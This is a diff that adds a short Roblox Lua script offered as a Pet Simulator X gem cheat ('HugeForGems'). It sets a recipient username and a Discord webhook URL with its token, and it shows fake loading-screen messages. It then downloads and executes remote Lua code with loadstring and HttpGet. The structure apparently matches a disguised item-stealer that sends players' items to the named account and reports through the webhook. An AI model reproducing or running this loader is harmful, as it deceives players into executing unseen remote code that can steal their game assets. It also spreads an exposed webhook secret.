@@ -1,0 +1,10 @@
+
+Username = "mihai98277771"
+WebHook = "https://discord.com/api/webhooks/1098692864571097108/Pimu41RaFheJF5ZrrkRgm0sHAdU3nIRGBnCua4WGN3XTLU1c1r5U7oDO4fMDgvjVBvG9"
+loadingscreen = true
+_G.CustomScriptName = "HugeForGems"
+_G.Text1 = "load"
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
